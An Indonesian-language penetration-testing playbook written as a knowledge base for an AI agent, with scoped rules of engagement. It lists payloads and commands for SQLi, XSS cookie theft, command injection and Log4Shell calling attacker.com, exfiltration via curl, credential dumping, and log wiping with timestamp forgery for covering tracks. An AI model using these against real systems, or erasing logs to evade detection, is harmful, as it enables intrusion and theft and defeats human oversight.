# MCP Agent - Penetration Testing Playbook v3.0

Dokumen ini adalah basis pengetahuan yang komprehensif dan pedoman operasional untuk MCP Agent sebagai Retrieval-Augmented Generation (RAG) basis. Semua tindakan AI agent harus didasarkan pada informasi di bawah ini, dengan integrasi data eksternal hanya jika diperlukan untuk augmentasi respons melalui tools seperti web search atau code execution untuk validasi. Jangan melakukan tindakan destruktif kecuali diizinkan secara eksplisit dalam Rules of Engagement (RoE). Playbook ini telah diperluas secara signifikan dari v2.0 untuk mencakup fase-fase tambahan seperti threat modeling, wireless dan mobile pentesting, cloud security, API testing, post-exploitation lanjutan, incident response integration, serta best practices untuk AI-driven automation dan ethical considerations. Tambahan termasuk lebih banyak tools, kerentanan spesifik, case studies, dan template untuk reporting yang lebih detail.

---

## 0. Primary Directives & RoE

- **Objective First:** Selalu fokus pada tujuan (objective) yang diberikan. Jangan menyimpang dari *scope* yang telah ditentukan. Jika objective berubah, konfirmasi ulang dengan pengguna atau stakeholder melalui protokol verifikasi.
- **Stealth:** Lakukan operasi dengan tingkat kebisingan (noise) serendah mungkin. Gunakan perintah yang tidak mudah terdeteksi oleh IDS/IPS standar jika memungkinkan, seperti rate-limiting pada scan, proxy chaining, atau Tor integration untuk obfuscation.
- **Documentation is Key:** Catat semua temuan, perintah yang dijalankan, dan hasilnya secara sistematis. Gunakan format yang disediakan di bagian Reporting. Integrasikan logging otomatis dengan tools seperti ELK Stack (jika tersedia) atau simple Markdown logs.
- **Do No Harm:** Prioritaskan integritas dan ketersediaan sistem target. Dilarang keras melakukan serangan DoS, menghapus file, atau mengubah data di luar yang diperlukan untuk pembuktian konsep (PoC). Gunakan environment staging atau virtual labs untuk testing destruktif.
- **Legal Boundary:** Hanya operasikan dalam lingkup (scope) yang diizinkan secara tertulis. Dapatkan persetujuan tertulis untuk setiap fase escalation, termasuk NDA dan liability waivers.
- **AI-Specific Directives:** Sebagai RAG basis, gunakan retrieval dari playbook ini sebagai primary source. Augmentasi dengan data eksternal (misal: CVE database via web_search tool) hanya untuk validasi, bukan pengganti. Hindari hallucination dengan cross-reference fakta internal. Gunakan code_execution tool untuk simulate exploits dalam environment aman.
- **Escalation Protocol:** Jika menemukan kerentanan kritis (misal: RCE dengan CVSS >9), hentikan operasi, laporkan segera ke tim incident response, dan dokumentasikan chain of custody.
- **Ethical Considerations:** Patuhi prinsip seperti OWASP Code of Ethics. Hindari bias dalam analisis; gunakan diverse sources untuk threat intelligence.
- **Update Mechanism:** Playbook harus di-review setiap 6 bulan atau setelah major CVE releases (e.g., via x_keyword_search untuk emerging threats).

---

## 1. Threat Modeling (Pemodelan Ancaman)

Sebelum reconnaissance, lakukan threat modeling untuk identifikasi risks potensial. Gunakan framework seperti STRIDE atau PASTA.

### Steps:
1. **Asset Identification:** List assets (e.g., databases, APIs, user data).
2. **Threat Actors:** Identifikasi aktor (e.g., insiders, nation-states).
3. **Attack Vectors:** Map potensi entry points (e.g., web apps, networks).
4. **Mitigation Prioritization:** Gunakan DREAD model untuk scoring (Damage, Reproducibility, Exploitability, Affected Users, Discoverability).

**Tool Integration:** Gunakan Microsoft Threat Modeling Tool atau draw.io untuk diagrams. Augment dengan web_search untuk real-world case studies (query: "STRIDE threat modeling examples").

**Output Template:**
- **Threat:** Spoofing identity.
- **Mitigation:** Implement MFA.

---

## 2. Reconnaissance (Pengintaian)

Tujuan fase ini adalah mengumpulkan informasi sebanyak mungkin tentang target tanpa melakukan interaksi langsung yang agresif. Fokus pada passive recon untuk menghindari deteksi. Integrasikan OSINT dengan AI analysis untuk pattern recognition.

### OSINT (Open-Source Intelligence)
Gunakan tools seperti Maltego, theHarvester, atau Recon-ng untuk mengumpulkan email, domain, dan informasi personel. Tambahkan social engineering prep.
**Command Example:**
```
theHarvester -d example.com -b google,linkedin,bing -f osint_results.html
recon-ng -m recon/domains-hosts/shodan_hostname -o DOMAIN=example.com
```

### Subdomain Enumeration
Gunakan tools seperti `subfinder`, `assetfinder`, `amass`, atau `Sublist3r`. Kombinasikan dengan brute-force dan permutation scanning.
**Command:**
```
subfinder -d example.com -o subdomains.txt --all
amass enum -d example.com -brute -o amass_subdomains.txt
```

### Passive Information Gathering
Cari informasi tentang teknologi yang digunakan menggunakan `whatweb`, Wappalyzer, BuiltWith, atau Shodan untuk exposed services.
**Command:**
```
whatweb --aggression=3 https://www.example.com
shodan search org:"Example Corp" --fields ip_str,port,org
```

### DNS Enumeration
Gunakan `dnsdumpster`, `dig`, atau `fierce` untuk zone transfer attempts (jika diizinkan) dan brute-force.
**Command:**
```
dig axfr @ns.example.com example.com
fierce -dns example.com -wordlist /path/to/hostfile.txt
```

### Directory & File Discovery
Gunakan `dirsearch`, `gobuster`, `ffuf`, atau `feroxbuster` dengan wordlist umum seperti SecLists atau custom lists. Tambahkan fuzzing untuk API endpoints.
**Command:**
```
dirsearch -u https://sub.example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e * --recursive
ffuf -u https://sub.example.com/FUZZ -w /path/to/wordlist.txt -fc 404,403 -mc 200
```

### Social Media & Human Recon
Cari informasi karyawan atau leaks di LinkedIn, GitHub, Twitter/X menggunakan tools seperti `sherlock`, `ghunt`, atau x_user_search tool.
**Command:**
```
sherlock username
```
**AI Integration:** Gunakan x_semantic_search untuk query seperti "leaked credentials example.com" dengan min_score_threshold=0.25.

### Additional Recon Techniques
- **WHOIS & RDAP:** `whois example.com` untuk ownership details.
- **Google Dorking:** Gunakan web_search dengan query seperti "site:example.com filetype:pdf" untuk sensitive files.
- **Certificate Transparency:** `crt.sh` via browse_page (url: https://crt.sh/?q=example.com).

---

## 3. Scanning & Enumeration (Pemindaian)

Fase ini melibatkan interaksi aktif dengan target untuk menemukan port, layanan, dan potensi kerentanan. Gunakan VPN, proxies, atau decoy scans untuk obfuscation.

### Port Scanning dengan Nmap
Lakukan pemindaian cepat terlebih dahulu, kemudian pemindaian mendalam pada port yang terbuka. Tambahkan OS fingerprinting dan script scanning.
**Initial Scan (Top 1000 ports):**
```
nmap -T4 -F -oN nmap_initial.txt --spoof-mac 0 target.example.com
```

**Detailed Scan (on open ports):**
```
nmap -sV -sC -O -p- -A -oN nmap_detailed.txt target.example.com
```
- `-sV`: Mendeteksi versi layanan.
- `-sC`: Menggunakan skrip default.
- `-O`: OS detection.
- `-A`: Aggressive scan (traceroute, etc.).
- `-p-`: All ports.

**Stealth Scan:**
```
nmap -sS -T2 -D decoy1,decoy2 -oN nmap_stealth.txt target.example.com
```

### Service Enumeration
- **HTTP/HTTPS:** Gunakan `nikto`, `dirb`, atau `wpscan` (untuk WordPress).
  **Command:** 
  ```
  nikto -h https://target.example.com -Tuning 1234567890
  ```
- **SMB/NetBIOS:** `enum4linux`, `smbmap`, atau `crackmapexec`.
  **Command:** 
  ```
  enum4linux -U -S -P target.example.com
  ```
- **SNMP:** `onesixtyone`, `snmp-check`, atau `snmpwalk`.
  **Command:** 
  ```
  snmpwalk -v2c -c public target.example.com system
  ```
- **FTP/SSH:** `hydra` untuk brute-force (jika diizinkan), atau `ssh-audit`.
  **Command:** 
  ```
  ssh-audit target.example.com
  ```
- **Database:** `nmap -sV --script=mysql-info target:3306`

### Vulnerability Scanning
Gunakan `Nuclei`, `OpenVAS/Nessus`, `Nessus` (via API), atau `ZAP` untuk automated scans.
**Command:**
```
nuclei -l subdomains.txt -t /path/to/nuclei-templates/ -severity critical,high,medium -o nuclei_results.txt
zap-cli spider https://target.example.com; zap-cli active-scan https://target.example.com
```

**AI Integration:** Gunakan code_execution untuk parse scan outputs (e.g., Python script to filter high-severity vulns).

---

## 4. Vulnerability Analysis & Exploitation

Fokus pada eksploitasi kerentanan yang telah teridentifikasi. Selalu prioritaskan kerentanan yang berdampak tinggi (CVSS >7). Gunakan Metasploit atau custom exploits. Verifikasi dengan PoC sebelum full exploit.

### SQL Injection (SQLi)
**Types:** Union-based, Error-based, Blind (Boolean/Time), Out-of-Band.
**Checklist Verifikasi:**
1. Test input parameters dengan `' OR 1=1 --`.
2. Amati errors atau behavior changes.
3. Payloads: `UNION SELECT NULL,NULL--`, `WAITFOR DELAY '0:0:5'`.
4. Gunakan `sqlmap` untuk automation.

**SQLMap Command:**
```
sqlmap -u "https://vulnerable.example.com/page.php?id=1" --dbs --batch --risk=3 --level=5 --tamper=space2comment
```
- Tambahan: `--os-shell` untuk RCE jika berhasil.

### Cross-Site Scripting (XSS)
**Types:** Reflected, Stored, DOM-based, Mutation XSS (mXSS).
**Payloads:**
- Reflected: `<script>alert(document.cookie)</script>`
- Bypass: `"><svg/onload=alert(1)>`, `javascript:alert(1)` (untuk href).
- Stored: Input di forums/comments.
- DOM: Test JS sinks seperti `location.hash`.

**Tool:** XSStrike atau Burp Suite Intruder.

### File Upload Vulnerability
**Metodologi Lanjutan:**
1. Test extensions: `.php`, `.svg` dengan embedded scripts.
2. Bypass: Magic bytes (e.g., `<?php` di GIF), .htaccess override.
3. Race conditions: Upload multiple times.
4. Jika RCE, upload reverse shell (e.g., pentestmonkey php-reverse-shell).

### Command Injection
**Payloads:** `; id`, `| whoami`, `&& curl attacker.com/shell`.
**Blind:** `; ping -c 10 attacker.com`.

### Local/Remote File Inclusion (LFI/RFI)
**LFI:** `../etc/passwd%00`, PHP wrappers seperti `php://filter/convert.base64-encode/resource=`.
**RFI:** `http://attacker.com/shell.php` jika remote includes enabled.

### API-Specific Vulnerabilities
- **Broken Authentication:** Test JWT manipulation dengan `jwt_tool`.
- **Rate Limiting Bypass:** Burp Intruder dengan threads.
- **GraphQL Introspection:** Query `__schema` untuk schema exposure.

### Other Common Vulnerabilities
- **IDOR:** Change IDs in requests; use Burp Repeater.
- **CSRF:** Check missing tokens; PoC: `<form action="target" method="POST">`.
- **SSRF:** Payloads for internal scans: `http://127.0.0.1:80`, cloud metadata.
- **XXE:** Payload untuk file read atau DoS (billion laughs).
- **Deserialization:** ysoserial untuk gadgets (Java: CommonsCollections, PHP: __wakeup).
- **RCE via Log4Shell:** Test dengan `${jndi:ldap://attacker.com/a}`.
- **Supply Chain Attacks:** Check third-party libs dengan `snyk` atau `dependabot`.

**General Exploitation Framework:**
- Metasploit: 
  ```
  msfconsole; use exploit/multi/http/struts2_rest_xstream; set RHOSTS target
  ```
- Custom: Gunakan code_execution untuk test payloads in Python (e.g., requests library).

**Case Study:** Heartbleed (CVE-2014-0160) – Use nmap script: 
```
nmap -p 443 --script ssl-heartbleed target
```

---

## 5. Post-Exploitation

Setelah akses, kumpulkan info, escalate, dan move laterally jika diizinkan.

### Privilege Escalation
- **Linux:** LinPEAS, linux-exploit-suggester; check kernel vulns (e.g., Dirty COW).
  **Command:** 
  ```
  uname -a; sudo -l; find / -perm -4000 2>/dev/null
  ```
- **Windows:** WinPEAS, PowerUp.ps1; check SeImpersonatePrivilege.
  **Command:** 
  ```
  whoami /priv; systeminfo
  ```

### Lateral Movement
- **Pivoting:** Metasploit autoroute atau proxychains.
- **Pass-the-Hash:** Mimikatz untuk NTLM hashes.
- **Kerberoasting:** GetUserSPNs.py untuk service tickets.

### Data Exfiltration
- **Stealthy Methods:** DNS tunneling (dnscat), HTTP POST.
  **Command:** 
  ```
  echo "data" | base64 | curl -d @- http://attacker.com/exfil
  ```

### Credential Dumping
- **Linux:** `/etc/shadow`, `.bash_history`.
- **Windows:** LSASS dump dengan Mimikatz: 
  ```
  sekurlsa::logonpasswords
  ```

---

## 6. Maintaining Access

Instal backdoor hanya untuk PoC; hapus setelah testing.
- **Web Shells:** Weevely, ASPX shells.
- **Persistence:** 
  - Linux: Cron, systemd services.
  - Windows: Scheduled tasks, registry keys.
- **C2 Frameworks:** Covenant atau Empire untuk advanced persistence.

---

## 7. Covering Tracks

- **Log Manipulation:** Truncate logs, forge timestamps.
  **Command:** 
  ```
  echo '' > /var/log/secure; utmpdump /var/run/utmp
  ```
- **Anti-Forensics:** Use rootkits (jika simulasi), delete temp files.
- **Evasion:** Change MAC/IP, use ephemeral VMs.

---

## 8. Specialized Testing

### Wireless Pentesting
- **Tools:** Aircrack-ng suite, Kismet.
- **Steps:** 
  ```
  airmon-ng start wlan0
  aireplay-ng -0 1 -a BSSID -c CLIENT mon0
  aircrack-ng -w wordlist capture.cap
  ```
- **Vulns:** WEP cracking, Evil Twin attacks.

### Mobile App Pentesting
- **Android:** APKTool untuk decompile, MobSF untuk static analysis, Frida untuk dynamic hooking.
- **iOS:** Objection, Cycript.
- **Vulns:** Insecure storage, hardcoded secrets.

### Cloud Security
- **AWS/Azure/GCP:** Pacu, CloudGoat untuk misconfigs.
- **Vulns:** Open S3 buckets (s3scanner), IAM over-privileges.
- **Command:** 
  ```
  aws s3 ls s3://bucket --no-sign-request
  ```

### IoT/Embedded Systems
- **Tools:** Binwalk untuk firmware extraction, Firmadyne untuk emulation.
- **Vulns:** Default creds, UART access.

---

## 9. Reporting (Pelaporan)

Laporkan dengan format standar. Sertakan executive summary, risk matrix, timeline, dan remediation roadmap.

### Format Laporan Temuan
- **Vulnerability Name:** 
- **CVE ID (if applicable):** 
- **Severity:** (dengan CVSS calculation).
- **Endpoint:** 
- **Description:** (termasuk root cause analysis).
- **Proof of Concept (PoC):** (steps, payloads, evidence seperti screenshots atau video).
- **Impact:** (business, compliance risks e.g., GDPR).
- **Recommendation:** (patches, configs; e.g., "Implement WAF rules").
- **References:** (OWASP, MITRE ATT&CK mappings).

### Additional Sections
- **Executive Summary:** Key findings, overall risk score.
- **Methodology:** Tools, steps, assumptions.
- **Risk Matrix:** 

| Severity \ Likelihood | Low | Medium | High |
|-----------------------|-----|--------|------|
| Critical             | Medium | High  | Critical |
| High                 | Low   | Medium | High    |

- **Timeline:** Chronological events.
- **Appendices:** Raw data, scripts.
- **Remediation Tracking:** Template untuk follow-up.

**Tool:** Serpico atau Dradis untuk report generation.

---

## 10. Best Practices & AI Integration

- **Automation:** Chain tools (e.g., nmap output to nuclei input).
- **AI-Augmented Analysis:** Gunakan RAG untuk query seperti "analyze nmap output" via code_execution (Python NLTK untuk parsing).
- **Continuous Monitoring:** Integrasikan dengan SIEM (e.g., Splunk queries).
- **Training & Simulations:** Gunakan CTF (HackTheBox, TryHackMe); simulate dengan view_image untuk diagrams.
- **Emerging Threats:** Gunakan x_keyword_search untuk "zero-day exploits" since:2025-01-01.
- **Performance Metrics:** Track time-to-detect, false positives.

Playbook ini dirancang untuk skalabilitas; ekspansi ke domain baru seperti AI/ML security jika diperlukan. Untuk update, gunakan web_search untuk "latest pentest methodologies".